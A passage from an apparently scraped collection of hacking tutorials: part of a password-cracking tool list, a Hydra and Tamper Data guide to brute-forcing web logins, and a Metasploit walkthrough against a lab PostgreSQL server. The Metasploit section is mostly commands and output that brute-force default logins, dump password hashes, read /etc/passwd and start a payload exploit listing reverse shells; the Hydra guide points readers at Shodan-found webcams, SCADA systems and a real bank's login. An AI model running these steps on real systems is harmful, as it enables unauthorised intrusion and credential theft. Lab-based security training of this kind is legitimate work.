iteration.\nStep 5: Password Cracking Software\nJohn the Ripper is probably the world's best known password cracking tool. It is strictly command line and strictly for Linux. Its lack of a GUI makes a bit more challenging to use, but it is also why it is such a fast password cracker.\nOne of the beauties of this tool is its built in default password cracking strategy. First, attempts a dictionary attack and if that fails, it then attempts to use combined dictionary words, then tries a hybrid attack of dictionary words with special characters and numbers and only if all those fail will it resort to a brute force.\nOphcrack is a free rainbow table-based password cracking tool for Windows. It is among the most popular Windows password cracking tools (Cain and Abel is probably the most popular; see below), but can also be used on Linux and Mac systems.\nImage by Ysangkok/Wikimedia Commons\nIt cracks LM and NTLM (Windows) hashes. For cracking Windows XP, Vista and Windows 7, you can download free rainbow tables. You can download Ophcrack on SourceForge, and you can get some free and premium rainbow tables for Ophcrack here.\nL0phtCrack is an alternative to Ophcrack, and attempts to crack Windows passwords from hashes in the SAM file or the Active Directory (AD). It also uses dictionary and brute force attacks for generating and guessing passwords.\nImage via L0phtCrack\nL0phtCrack was acquired by Symantec and they promptly discontinued it in 2006. Later, L0phtCrack developers re-acquired this excellent password cracking tool and re-released it in 2009. You can download the tool here.\nCain and Abel\nCain and Abel just might be the best known password cracking tool on the planet. Written strictly for Windows, it can crack numerous hash types, including NTLM, NTLMv2, MD5, wireless, Oracle, MySQL, SQL Server, SHA1, SHA2, Cisco, VoIP, and many others.\nCain and Abel can crack passwords using a dictionary attack, rainbow attack, and brute force. One of its better features is the ability to select the password length and character set when attempting a brute force attack. And besides being an excellent password cracking tool, it is also a great ARP Poisoning and MiTM tool.\nTHC-Hydra is probably the most widely used online hacking tool. It is capable of cracking web form authentication, and when used in conjunction with other tools such as Tamper Data, it can be a powerful and effective tool for cracking nearly every type of online password authentication mechanism.\nThe initial help screen for Hydra.\nBrutus is an online password cracking tool that many consider the fastest online password cracker. It is free and available on both Linux and Windows, and it supports password cracking in HTTP (Basic Authentication), HTTP (HTML Form/CGI), POP3, FTP, SMB, Telnet, and other types such as IMAP, NNTP, NetBus, etc.\nBrutus has not been updated in quite awhile, but it can still be useful and since it is open source, you can update it yourself. Brutus can be downloaded here.\nAircrack-Ng\nIn my humble opinion, aircrack-ng is undoubtedly the best all-around Wi-Fi hacking software available. It is capable of cracking both WEP and WPA2, and it is also capable of doing the following, among many other things.\n1. Creating a Soft AP",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Online Passwords with Tamper Data & THC Hydra",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-passwords-with-tamper-data-thc-hydra-0155374/",
        "content": "* WonderHowTo\nWelcome back, my tenderfoot hackers!\nNot too long ago, I showed how to find variousonlinedevices using Shodan. As you remember, Shodan is a different type of search engine. Instead of indexing the content of websites, it pulls the banner of web servers on all types of online devices and then indexes the content of those banners.\nThis info can be from any type of device including web servers, routers, webcams, SCADA systems, home security systems, and basically anything that has a web interface, which in 2014, means just about everything.\nI mentioned in my first Shodan tutorial that you can often access these devices by simply using the default username and password, as administrators are often lazy and neglectful. The question we want to address in this tutorial is—what do we do when the site requires credentials and the defaults don't work?\nThere is tool that is excellent for cracking online passwords and it is called THC-Hydra. Fortunately, it is built into our Kali distribution, so we don't need to download, install, or compile anything to use it.\nImage via Shutterstock\nStep 1: Download & Install Tamper Data\nBefore we start with THC-Hydra, let's install another tool that complements THC-Hydra. This tool is known as \"Tamper Data\", and it is a plug-in for Mozilla's Firefox. Since our IceWeasel browser in Kali is built on the open source Firefox, it plugs equally well into Iceweasel.\nTamper Data enables us to capture and see the HTTP and HTTPS GET and POST information. In essense, Tamper Data is a web proxy similar to Burp Suite, but simpler and built right into our browser.\nTamper Data enables us to grab the information from the browser en route to the server and modify it. In addition, once we get into more sophisticated web attacks, it is crucial to know what fields and methods are being used by the web form, and Tamper Data can help us with that as well.\nLet's download it from here and install it into Iceweasel.\nInstall the Tamper Data Firefox add-on in Iceweasel.\nStep 2: Test Tamper Data\nNow that we have Tamper Data installed into our browser, let's see what it can do. Activate Tamper Data and then navigate to any website. Below you can see that I have navigated to Bank of America and Tamper Data provides we with each HTTPS GET and POST request between my browser and the server.\nHTTPS GET and POST requests for BOA.\nWhen I try to login to the site with the username \"hacker\", Tamper Data returns to me all the critical info on the form. This information will be useful when we begin to use Hydra to crack online passwords.\nTamper Data information for BOA login.\nStep 3: Open THC Hydra\nNow that we have Tamper Data in place and working properly, let's open Hydra. You can find it at Kali Linux -> Password -> Online Attacks -> Hydra. You can see it about midway among the list of online password cracking tools.\nSelect the \"hydra\" tool.\nStep 4: Understand the Hydra Basics\nWhen we open Hydra, we are greeted with this help screen. Note the sample syntax at the bottom of the screen. Hydra's syntax is relatively simple and similar to other password cracking tools.\nThe initial help screen for Hydra.\nLet's take a look at it further.\nhydra -l username -p passwordlist.txt target\nThe username can be a single user name, such as \"admin\" or username list, passwordlist is usually any text file that contains potential passwords, and target can be an IP address and port, or it can be a specific web form field.\nAlthough you can use ANY password text file in Hydra, Kali has several built in. Let's change directories to /usr/share/wordlists:\nkali > cd /usr/share/wordlists\nThen list the contents of that directory:\nYou can see below, Kali has many word lists built in. You can use any of these or any word list you download from the web as long as it was created in Linux and is in the .txt format.\nThe default word lists available in Kali.\nStep 5: Use Hydra to Crack Passwords\nIn the example below, I am using Hydra to try to crack the \"admin\" password using the \"rockyou.txt\" wordlist at 192.168.89.190 on port 80.\nAn example of using Hydra.\nUsing Hydra on Web Forms\nUsing Hydra on web forms adds a level of complexity, but the format is similar except that you need info on the web form parameters that Tamper Data can provide us.\nThe syntax for using Hydra with a web form is to use <url>:<formparameters>:<failure string> where previously we had used the target IP. We still need a username list and password list.\nProbably the most critical of these parameters for web form password hacking is the \"failure string\". This is the string that the form returns when the username or password is incorrect. We need to capture this and provide it to Hydra so that Hydra knows when the attempted password is incorrect and can then go to the next attempt.\nIn my next Hydra tutorial, I will show you how to use this information to brute-force any web form including all those web cams, SCADA systems, traffic lights, etc. that we can find on Shodan.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image via Shutterstock",
        "category": "Password Cracking"
    },
    {
        "title": "Gather Information on PostgreSQL Databases with Metasploit",
        "link": "https://null-byte.wonderhowto.com/how-to/gather-information-postgresql-databases-with-metasploit-0218317/",
        "content": "* WonderHowTo\nAttacks against databases have become one of the most popular and lucrative activities for hackers recently. New data breaches seem to be popping up every week, but even with all of that attention, databases continue to be a prime target. All of these attacks have to start somewhere, and we'll be exploring a variety of methods to gather information on PostgreSQL databases with Metasploit.\nPostgreSQL is an open-source relational database management system (RDBMS) that uses the SQL language, along with many other features, to handle a wide variety of data workloads. Initially developed for Unix, PostgreSQL runs on all major operating systems and is the default database for macOS Server.\n* Don't Miss: How to Fingerprint Databases & Perform General Reconnaissance\nPostgreSQL is known for its extensibility, reliability, data integrity, strong architecture, and robust feature set, including the popular PostGIS geospatial database extender. It's also ACID compliant and has a dedicated open-source community.\nFor the most part, PostgreSQL conforms with SQL language standards, but some syntax and functions differ slightly. It's often used for heavy workloads, where concurrency and performance are a priority, and offers modern security and recovery features that are essential in enterprise environments. Overall, PostgreSQL is a fantastic RDBMS that's both flexible and extensible.\nStep 1: Use an Nmap Scan\nIn this guide, we're using Metasploitable 2 as the target and Kali Linux as the local machine. You can use the same or something similar.\nAfter getting the testing lab set up, we need to determine if the PostgreSQL service is running on the target. To do so, we can run an Nmap scan on port 5432, which is usually the default port for PostgreSQL. Use the -p flag to specify the port and -sV to enable version detection:\n~# nmap -sV 10.10.0.50 -p 5432\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 11:41 CST\nNmap scan report for 10.10.0.50\nHost is up (0.00064s latency).\nPORT     STATE SERVICE    VERSION\n5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7\nMAC Address: 00:1D:09:55:B1:3B (Dell)\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.71 seconds\nWe can see that the PostgreSQL service is open on the target and running version 8.3.0 – 8.3.7.\nOn Amazon: Mastering PostgreSQL 12: Advanced Techniques to Build & Administer Scalable & Reliable PostgreSQL Database Applications, 3rd Edition\nStep 2: Get the Version Info\nMetasploit has a number of modules that we can use to gather useful information about PostgreSQL databases. Fire it up by typing msfconsole in the terminal.\n~# msfconsole\n,           ,\n/             \\\n((__---,,,---__))\n(_) O O (_)_________\n\\ _ /            |\\\no_o \\   M S F   | \\\n\\   _____  |  *\n|||   WW|||\n|||     |||\n=[ metasploit v5.0.87-dev                          ]\n+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]\n+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 7 evasion                                       ]\nMetasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x\nOnce it loads, we can use the search function to look for modules related to PostgreSQL:\nmsf5 > search postgre\nMatching Modules\n================\n#   Name                                                        Disclosure Date  Rank       Check  Description\n-   ----                                                        ---------------  ----       -----  -----------\n0   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection\n1   auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset\n2   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query\n3   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query\n4   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases\n5   auxiliary/analyze/jtr_postgres_fast                                          normal     No     John the Ripper Postgres SQL Password Cracker\n6   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     Yes    PostgreSQL Database Name Command Line Flag Injection\n7   auxiliary/scanner/postgres/postgres_hashdump                                 normal     Yes    Postgres Password Hashdump\n8   auxiliary/scanner/postgres/postgres_login                                    normal     Yes    PostgreSQL Login Utility\n9   auxiliary/scanner/postgres/postgres_schemadump                               normal     Yes    Postgres Schema Dump\n10  auxiliary/scanner/postgres/postgres_version                                  normal     Yes    PostgreSQL Version Probe\n11  auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL\n12  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution\n13  exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection\n14  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution\n15  exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution\n16  exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution\n17  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution\n18  post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History\nThe first one we'll cover will give us some information about the running version. It never hurts to double-check since certain exploits will only work for certain versions. Load the module with the use command:\nmsf5 > use auxiliary/scanner/postgres/postgres_version\nNext, let's take a look at the options to view the current settings:\nmsf5 auxiliary(scanner/postgres/postgres_version) > options\nModule options (auxiliary/scanner/postgres/postgres_version):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nDATABASE  template1        yes       The database to authenticate against\nPASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.\nRHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT     5432             yes       The target port\nTHREADS   1                yes       The number of concurrent threads (max one per host)\nUSERNAME  postgres         yes       The username to authenticate as\nVERBOSE   false            no        Enable verbose output\nWe can leave all the defaults for now, but we will need to set the rhosts option to the IP address of our target:\nmsf5 auxiliary(scanner/postgres/postgres_version) > set rhosts 10.10.0.50\nrhosts => 10.10.0.50\nNow all we have to do is run it; use the run command to kick it off:\nmsf5 auxiliary(scanner/postgres/postgres_version) > run\n[*] 10.10.0.50:5432 Postgres - Version PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4) (Post-Auth)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nAnd we can see the version number is 8.3.1, which is a little more specific than what Nmap returned.\nStep 3: Brute-Force the Login\nThe next module we'll look at will attempt to brute-force the login to the PostgreSQL database using a list of default usernames and passwords. Load it with the use command:\nmsf5 > use auxiliary/scanner/postgres/postgres_login\nLet's take a look at this modules' options:\nmsf5 auxiliary(scanner/postgres/postgres_login) > options\nModule options (auxiliary/scanner/postgres/postgres_login):\nName              Current Setting                                                               Required  Description\n----              ---------------                                                               --------  -----------\nBLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users\nBRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5\nDATABASE          template1                                                                     yes       The database to authenticate against\nDB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database\nDB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list\nDB_ALL_USERS      false                                                                         no        Add all users in the current database to the list\nPASSWORD                                                                                        no        A specific password to authenticate with\nPASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line\nProxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]\nRETURN_ROWSET     true                                                                          no        Set to true to see query result sets\nRHOSTS                                                                                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT             5432                                                                          yes       The target port\nSTOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host\nTHREADS           1                                                                             yes       The number of concurrent threads (max one per host)\nUSERNAME                                                                                        no        A specific username to authenticate as\nUSERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-separated) users and passwords, one pair per line\nUSER_AS_PASS      false                                                                         no        Try the username as the password for all users\nUSER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line\nVERBOSE           true                                                                          yes       Whether to print output for all attempts\nThis one has a few more options we can mess with, but for now, the defaults will work. Just set the remote hosts option again, and we should be good to go:\nmsf5 auxiliary(scanner/postgres/postgres_login) > set rhosts 10.10.0.50\nrhosts => 10.10.0.50\nNow we can launch the module:\nmsf5 auxiliary(scanner/postgres/postgres_login) > run\n[!] No active DB -- Credential data will not be saved!\n[-] 10.10.0.50:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)\n[+] 10.10.0.50:5432 - Login Successful: postgres:postgres@template1\n[-] 10.10.0.50:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)\n[-] 10.10.0.50:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nWe can see it go through each username and password combination, most of which fail, but we are left with one successful login.\nStep 4: Run SQL Queries\nWe can run SQL queries right from another Metasploit module instead of logging into the database directly. Load the module:\nmsf5 > use auxiliary/admin/postgres/postgres_sql\nAnd take a look at the options:\nmsf5 auxiliary(admin/postgres/postgres_sql) > options\nModule options (auxiliary/admin/postgres/postgres_sql):\nName           Current Setting   Required  Description\n----           ---------------   --------  -----------\nDATABASE       template1         yes       The database to authenticate against\nPASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.\nRETURN_ROWSET  true              no        Set to true to see query result sets\nRHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT          5432              yes       The target port\nSQL            select version()  no        The SQL query to execute\nUSERNAME       postgres          yes       The username to authenticate as\nVERBOSE        false             no        Enable verbose output\nInstead of setting the remote hosts option each time, we can use the setg command to set the option globally. This means it will remain set when we switch to other modules unless we change it again.\nmsf5 auxiliary(admin/postgres/postgres_sql) > setg rhosts 10.10.0.50\nrhosts => 10.10.0.50\nThe default query for this module is set to select the version of the database — let's see what that looks like:\nmsf5 auxiliary(admin/postgres/postgres_sql) > run\n[*] Running module against 10.10.0.50\nQuery Text: 'select version()'\n==============================\nPostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)\n[*] Auxiliary module execution completed\nBut we can set this option to any valid SQL code we want. For instance, the following query will return the username and password of the current user:\nSELECT usename, passwd FROM pg_shadow;\nLet's set the option to this now:\nmsf5 auxiliary(admin/postgres/postgres_sql) > set sql select usename, passwd from pg_shadow\nsql => select usename, passwd from pg_shadow\nAnd run the module again:\nmsf5 auxiliary(admin/postgres/postgres_sql) > run\n[*] Running module against 10.10.0.50\nQuery Text: 'select usename, passwd from pg_shadow'\n===================================================\nusename   passwd\n-------   ------\npostgres  md53175bce1d3201d16594cebf9d7eb3f9d\n[*] Auxiliary module execution completed\nNow we can see the username and password hash of the current user.\nStep 5: Dump the Hashes\nMetasploit also has a module that will quickly dump any password hashes in the database for us. Load it up:\nmsf5 > use auxiliary/scanner/postgres/postgres_hashdump\nAnd view the options:\nmsf5 auxiliary(scanner/postgres/postgres_hashdump) > options\nModule options (auxiliary/scanner/postgres/postgres_hashdump):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nDATABASE  postgres         yes       The database to authenticate against\nPASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.\nRHOSTS    10.10.0.50       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT     5432             yes       The target port\nTHREADS   1                yes       The number of concurrent threads (max one per host)\nUSERNAME  postgres         yes       The username to authenticate as\nEverything looks good at this point, and since we already set the remote host earlier, all we have to do is run it:\nmsf5 auxiliary(scanner/postgres/postgres_hashdump) > run\n[+] Query appears to have run successfully\n[+] Postgres Server Hashes\n======================\nUsername  Hash\n--------  ----\npostgres  md53175bce1d3201d16594cebf9d7eb3f9d\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nWe can see the query runs successfully and returns the password hash.\nStep 6: Dump Schema Info\nThe next module we'll cover will attempt to dump any schema information it can find about the database. This can be useful to get a broad picture of all the databases, tables, and settings in use. Load the module:\nmsf5 > use auxiliary/scanner/postgres/postgres_schemadump\nAnd check the options:\nmsf5 auxiliary(scanner/postgres/postgres_schemadump) > options\nModule options (auxiliary/scanner/postgres/postgres_schemadump):\nName             Current Setting  Required  Description\n----             ---------------  --------  -----------\nDATABASE         postgres         yes       The database to authenticate against\nDISPLAY_RESULTS  true             yes       Display the Results to the Screen\nPASSWORD         postgres         no        The password for the specified username. Leave blank for a random password.\nRHOSTS           10.10.0.50       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT            5432             yes       The target port\nTHREADS          1                yes       The number of concurrent threads (max one per host)\nUSERNAME         postgres         yes       The username to authenticate as\nWe can leave the defaults and launch the module:\nmsf5 auxiliary(scanner/postgres/postgres_schemadump) > run\n[+] Postgres SQL Server Schema\nHost: 10.10.0.50\n====================\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nWe can see that it didn't return anything, but it's worth a shot to try and gather data like this for reconnaissance.\nStep 7: Read the System Files\nWe can also use Metasploit to read system files via the PostgreSQL database. Load the module:\nmsf5 > use auxiliary/admin/postgres/postgres_readfile\nAnd take a look at the options:\nmsf5 auxiliary(admin/postgres/postgres_readfile) > options\nModule options (auxiliary/admin/postgres/postgres_readfile):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nDATABASE  template1        yes       The database to authenticate against\nPASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.\nRFILE     /etc/passwd      yes       The remote file\nRHOSTS    10.10.0.50       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT     5432             yes       The target port\nUSERNAME  postgres         yes       The username to authenticate as\nVERBOSE   false            no        Enable verbose output\nThe default remote file to read is set to /etc/passwd, which will work for now. Let's kick it off:\nmsf5 auxiliary(admin/postgres/postgres_readfile) > run\n[*] Running module against 10.10.0.50\nQuery Text: 'CREATE TEMP TABLE hoieZbLAeCQ (INPUT TEXT);\nCOPY hoieZbLAeCQ FROM '/etc/passwd';\nSELECT * FROM hoieZbLAeCQ'\n====================================================================================================================================\nbackup:x:34:34:backup:/var/backups:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nbind:x:105:113::/var/cache/bind:/bin/false\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\ndhcp:x:101:102::/nonexistent:/bin/false\ndistccd:x:111:65534::/:/bin/false\nftp:x:107:65534::/home/ftp:/bin/false\ngames:x:5:60:games:/usr/games:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\nklog:x:103:104::/home/klog:/bin/false\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nmysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false\nnews:x:9:9:news:/var/spool/news:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\npostfix:x:106:115::/var/spool/postfix:/bin/false\npostgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nproftpd:x:113:65534::/var/run/proftpd:/bin/false\nproxy:x:13:13:proxy:/bin:/bin/sh\nroot:x:0:0:root:/root:/bin/bash\nservice:x:1002:1002:,,,:/home/service:/bin/bash\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nstatd:x:114:65534::/var/lib/nfs:/bin/false\nsync:x:4:65534:sync:/bin:/bin/sync\nsys:x:3:3:sys:/dev:/bin/sh\nsyslog:x:102:103::/home/syslog:/bin/false\ntelnetd:x:112:120::/nonexistent:/bin/false\ntomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false\nuser:x:1001:1001:just a user,111,,:/home/user:/bin/bash\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\ndhcp:x:101:102::/nonexistent:/bin/false\nsyslog:x:102:103::/home/syslog:/bin/false\nklog:x:103:104::/home/klog:/bin/false\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nbind:x:105:113::/var/cache/bind:/bin/false\npostfix:x:106:115::/var/spool/postfix:/bin/false\nftp:x:107:65534::/home/ftp:/bin/false\npostgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nmysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false\ntomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false\ndistccd:x:111:65534::/:/bin/false\nuser:x:1001:1001:just a user,111,,:/home/user:/bin/bash\nservice:x:1002:1002:,,,:/home/service:/bin/bash\ntelnetd:x:112:120::/nonexistent:/bin/false\nproftpd:x:113:65534::/var/run/proftpd:/bin/false\nstatd:x:114:65534::/var/lib/nfs:/bin/false\n[+] 10.10.0.50:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20191211120809_default_10.10.0.50_postgres.file_153011.txt\n[*] Auxiliary module execution completed\nWe can see that it first creates a temporary table, copies the content of the desired file, and returns it to us on the screen. It also saves this as loot to use at a later convenience.\nLet's try to read a different file – perhaps /etc/shadow this time. First, set the option:\nmsf5 auxiliary(admin/postgres/postgres_readfile) > set rfile /etc/shadow\nrfile => /etc/shadow\nThen, run the module:\nmsf5 auxiliary(admin/postgres/postgres_readfile) > run\n[*] Running module against 10.10.0.50\n[-] 10.10.0.50:5432 Postgres - Insufficent file permissions.\n[*] Auxiliary module execution completed\nWe can see this time that it was unsuccessful since we don't have the necessary file permissions. Always worth a try, though.\nStep 8: Send a Payload\nThe final module we will explore today is an exploit that will attempt to place and execute a payload on the target. First, load the module:\nmsf5 > use exploit/linux/postgres/postgres_payload\nAnd view the options:\nmsf5 exploit(linux/postgres/postgres_payload) > options\nModule options (exploit/linux/postgres/postgres_payload):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nDATABASE  template1        yes       The database to authenticate against\nPASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.\nRHOSTS    10.10.0.50       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT     5432             yes       The target port\nUSERNAME  postgres         yes       The username to authenticate as\nVERBOSE   false            no        Enable verbose output\nExploit target:\n0   Linux x86\nEverything looks good, but since this is an exploit, we'll need to set a payload. Use the show command to see the available payloads for this module:\nmsf5 exploit(linux/postgres/postgres_payload) > show payloads\nCompatible Payloads\n===================\n#   Name                                      Disclosure Date  Rank    Check  Description\n-   ----                                      ---------------  ----    -----  -----------\n0   generic/custom                                             normal  No     Custom Payload\n1   generic/debug_trap                                         normal  No     Generic x86 Debug Trap\n2   generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline\n3   generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline\n4   generic/tight_loop                                         normal  No     Generic x86 Tight Loop\n5   linux/x86/chmod                                            normal  No     Linux Chmod\n6   linux/x86/exec                                             normal  No     Linux Execute Command\n7   linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)\n8   linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)\n9   linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager\n10  linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)\n11  linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)\n12  linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)\n13  linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager\n14  linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager\n15  linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager\n16  linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP\n17  linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline\n18  linux/x86/read_file                                        normal  No     Linux Read File\n19  linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)\n20  